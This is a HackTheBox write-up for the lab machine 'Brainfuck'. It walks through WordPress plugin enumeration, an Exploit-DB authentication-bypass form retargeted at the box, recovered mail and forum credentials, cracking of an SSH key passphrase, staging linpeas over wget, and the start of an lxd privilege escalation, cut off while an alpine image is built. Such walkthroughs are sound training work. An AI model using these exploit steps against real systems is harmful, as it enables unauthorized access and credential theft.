---
title: "HackTheBox Walkthrough - Brainfuck"
date: "2023-05-10"
draft: "false"
---

This post is writeup of the HackTheBox machine.

## Brainfuck

[https://app.hackthebox.com/machines/Brainfuck](https://app.hackthebox.com/machines/Brainfuck)


## Nmap

Nmap result

```sh
$ nmap -sC -sV 10.10.10.17
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT
Nmap scan report for 10.10.10.17
Host is up (0.072s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.30 seconds
```

Found some host name

```sh
cat /etc/hosts
<IP address> brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```


## Web
I opend `brainfuck.htb` , find the following text

```
Dev Update
SMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb
SMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb
```

Using `whatweb` .

```sh
$ whatweb https://www.brainfuck.htb
https://www.brainfuck.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], RedirectLocation[https://brainfuck.htb/], nginx[1.10.0]
https://brainfuck.htb/ [200 OK] Bootstrap[4.7.3], Country[RESERVED][ZZ], Email[ajax-loader@2x.gif,orestis@brainfuck.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], Modernizr, PoweredBy[WordPress,], Script[text/javascript], Title[Brainfuck Ltd. &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0]
```

This website was created Wordpress.

Check vuln plugin with `wpscan`

```jsx
$ wpscan --url https://brainfuck.htb --disable-tls-checks -e vp --api-token <API-token>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Tue May  9 07:27:36 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

=== snipped ===

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

=== snipped ===

 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
 |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
 |      - https://packetstormsecurity.com/files/140413/
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
 |      - https://plugins.trac.wordpress.org/changeset/1763596
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 72

[+] Finished: Tue May  9 07:27:43 2023
[+] Requests Done: 39
[+] Cached Requests: 5
[+] Data Sent: 10.214 KB
[+] Data Received: 208.404 KB
[+] Memory used: 246.844 MB
[+] Elapsed time: 00:00:07
```

I can get RCE.

```sh
| [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
|     Fixed in: 8.0.8
|     References:
|      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
|      - https://plugins.trac.wordpress.org/changeset/1763596
```

```sh
$ searchsploit Support Plus
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ManageEngine Support Center Plus 7.8 Build 7801 - Directory Traversal                                                                                                                                     | jsp/webapps/17442.txt
ManageEngine Support Center Plus 7903 - Multiple Vulnerabilities                                                                                                                                          | multiple/webapps/18745.txt
ManageEngine Support Center Plus 7908 - Multiple Vulnerabilities                                                                                                                                          | jsp/webapps/22040.txt
ManageEngine Support Center Plus 7916 - Directory Traversal                                                                                                                                               | php/webapps/31262.txt
ManageEngine SupportCenter Plus 7.90 - Multiple Vulnerabilities                                                                                                                                           | multiple/webapps/37322.txt
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                                                                                  | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                                                                                    | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                                                                                           | php/webapps/40939.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

User enumrate

```jsx
$ wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate                                                  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Tue May  9 07:35:20 2023

Interesting Finding(s):
===snipped===
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue May  9 07:37:00 2023
[+] Requests Done: 3411
[+] Cached Requests: 43
[+] Data Sent: 939.757 KB
[+] Data Received: 747.878 KB
[+] Memory used: 281.445 MB
[+] Elapsed time: 00:01:40
```

We found user admin.
Try to use `php/webapps/41006.txt`

```sh
$ cp /usr/share/exploitdb/exploits/php/webapps/41006.txt .
$ cat 41006.txt                                           
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
# Date: 10-01-2017
# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: web

1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.
```

Edit this.

```sh
$ edit 41006.txt
$ mv 41006.txt 41006.html
$ cat 41006.html  
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

And launch http server on local machine.

```sh
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
127.0.0.1 - - [09/May/2023 07:51:30] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [09/May/2023 07:51:31] "GET /41006.html HTTP/1.1" 200 -
```

And login… I got admin's permission.
In admin dashboard, I can find SMTP account.

```
Dashboard > Settings > General Settings > Easy WP SMTP Settings (HTML)
```

SMTP Account

```
Email: orestis@brainfuck.htb, Pass:kHGuERB29DNiNE
```

In mailbox, we can find message
(Using Email client called evolution)

```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```

Move to [`https://sup3rs3cr3t.brainfuck.htb`](https://sup3rs3cr3t.brainfuck.htb/)

Login bellow username/password

In [`https://sup3rs3cr3t.brainfuck.htb/d/3-key/2`](https://sup3rs3cr3t.brainfuck.htb/d/3-key/2) , I found strange messages.

```
Pieagnm - Jkoijeg nbw zwx mle grwsnn
```

[https://www.boxentriq.com/code-breaking/cipher-identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) said, that is ****[`Vigenere Cipher`](https://www.boxentriq.com/code-breaking/cipher-identifier#vigenere-cipher)****

We can solve it with [https://rumkin.com/tools/cipher/one-time-pad/](https://rumkin.com/tools/cipher/one-time-pad/)

PAD: `Orestis - Hacking for fun and profit`
Decode text: `Pieagnm - Jkoijeg nbw zwx mle grwsnn`
We can get key, `fuckmybrain`
And decode forum message.

```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

We get SSH key.
Try to get passphrase

```sh
$ ssh2john ./id_rsa > ssh.hash                                                 
┌──(kali㉿kali)-[~/lab/brainfuck]
└─$ ls
41006.html  id_rsa  ssh.hash
┌──(kali㉿kali)-[~/lab/brainfuck]
└─$ john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (./id_rsa)     
1g 0:00:00:02 DONE (2023-05-09 08:33) 0.4132g/s 5148Kp/s 5148Kc/s 5148KC/s 3prash0..3pornuthin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Get user flag

```jsx
$ ssh -i ./id_rsa orestis@10.10.10.17   
The authenticity of host '10.10.10.17 (10.10.10.17)' can't be established.
ED25519 key fingerprint is SHA256:R2LI9xfR5z8gb7vJn7TAyhLI9RT5GEVp76CK9aoKnM8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.17' (ED25519) to the list of known hosts.
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt

orestis@brainfuck:~$ cat user.txt
```

## root

I checked some files on `orestis` 's directory.

```sh
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

I am thinking find the exploit with linepeas
Get on local machine

```sh
$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
--2023-05-09 08:38:22--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/carlospolop/PEASS-ng/releases/download/20230508-32e5ab22/linpeas.sh [following]
--2023-05-09 08:38:23--  https://github.com/carlospolop/PEASS-ng/releases/download/20230508-32e5ab22/linpeas.sh
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/277b0143-641e-4cd9-bc57-a411b6b7c47a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230509%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230509T123823Z&X-Amz-Expires=300&X-Amz-Signature=4fb1cdc81baafd763e73c02070f4921368aeb21caa6669b065ca2694a33f68ee&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2023-05-09 08:38:23--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/277b0143-641e-4cd9-bc57-a411b6b7c47a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230509%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230509T123823Z&X-Amz-Expires=300&X-Amz-Signature=4fb1cdc81baafd763e73c02070f4921368aeb21caa6669b065ca2694a33f68ee&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830029 (811K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 810.58K  --.-KB/s    in 0.01s   

2023-05-09 08:38:23 (58.5 MB/s) - ‘linpeas.sh’ saved [830029/830029]
            
┌──(kali㉿kali)-[~]
└─$ mv linpeas.sh lab/brainfuck                      
┌──(kali㉿kali)-[~]
└─$ cd lab/brainfuck                 
┌──(kali㉿kali)-[~/lab/brainfuck]
└─$ ls
41006.html  id_rsa  linpeas.sh  ssh.hash                                      
┌──(kali㉿kali)-[~/lab/brainfuck]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Get on lab machine.

```sh
orestis@brainfuck:~$ wget http://10.10.14.32:8080/linpeas.sh
--2023-05-09 15:40:12--  http://10.10.14.32:8080/linpeas.sh
Connecting to 10.10.14.32:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830029 (811K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 810.58K  1.84MB/s    in 0.4s    

2023-05-09 15:40:12 (1.84 MB/s) - ‘linpeas.sh’ saved [830029/830029]
```

Run `linpeas.sh` and output result.

```jsx
orestis@brainfuck:~$ ./linpeas.sh 

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.4.0-75-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #96-Ubuntu SMP Thu Apr 20 09:56:33 UTC 2017
User & Groups: uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
Hostname: brainfuck
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
=== snipped ===
```

This user joined `lxd` group.

```sh
User & Groups: uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

We can exploit it.

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

On local machine

```sh
$ wget wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2023-05-09 08:54:55--  http://wget/
Resolving wget (wget)... failed: Temporary failure in name resolution.
wget: unable to resolve host address ‘wget’
--2023-05-09 08:54:55--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8060 (7.9K) [text/plain]
Saving to: ‘build-alpine’

build-alpine                                               100%[========================================================================================================================================>]   7.87K  --.-KB/s    in 0s      

2023-05-09 08:54:55 (41.9 MB/s) - ‘build-alpine’ saved [8060/8060]

FINISHED --2023-05-09 08:54:55--
Total wall clock time: 0.3s
Downloaded: 1 files, 7.9K in 0s (41.9 MB/s)
```

I build alpine image on local machine.

```sh
$ chmod u+x build-alpine                                               
┌──(kali㉿kali)-[~/lab/brainfuck]
└─$ sudo bash ./build-alpine       
[sudo] password for kali: 
Determining the latest release... v3.17
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.17/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.12.10-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2574  100  2574    0     0    643      0  0:00:04  0:00:04 --:--:--   643
--2023-05-09 08:56:38--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2574 (2.5K) [text/plain]
Saving to: ‘/home/kali/lab/brainfuck/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/kali/lab/brainfuck/rootfs/usr/share/alpine-mirrors/M 100%[========================================================================================================================================>]   2.51K  --.-KB/s    in 0s      

2023-05-09 08:56:38 (255 MB/s) - ‘/home/kali/lab/brainfuck/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2574/2574]

Selecting mirror http://mirror.lagoon.nc/alpine//v3.17/main
fetch http://mirror.lagoon.nc/alpine//v3.17/main/x86_64/APKINDEX.tar.gz
(1/25) Installing alpine-baselayout-data (3.4.0-r0)
(2/25) Installing musl (1.2.3-r4)
(3/25) Installing busybox (1.35.0-r29)
Executing busybox-1.35.0-r29.post-install
(4/25) Installing busybox-binsh (1.35.0-r29)
(5/25) Installing alpine-baselayout (3.4.0-r0)
Executing alpine-baselayout-3.4.0-r0.pre-install
Executing alpine-baselayout-3.4.0-r0.post-install
(6/25) Installing ifupdown-ng (0.12.1-r1)
(7/25) Installing libcap2 (2.66-r0)
(8/25) Installing openrc (0.45.2-r7)
Executing openrc-0.45.2-r7.post-install
(9/25) Installing mdev-conf (4.3-r0)
(10/25) Installing busybox-mdev-openrc (1.35.0-r29)
(11/25) Installing alpine-conf (3.15.1-r1)
(12/25) Installing alpine-keys (2.4-r1)
(13/25) Installing alpine-release (3.17.3-r0)
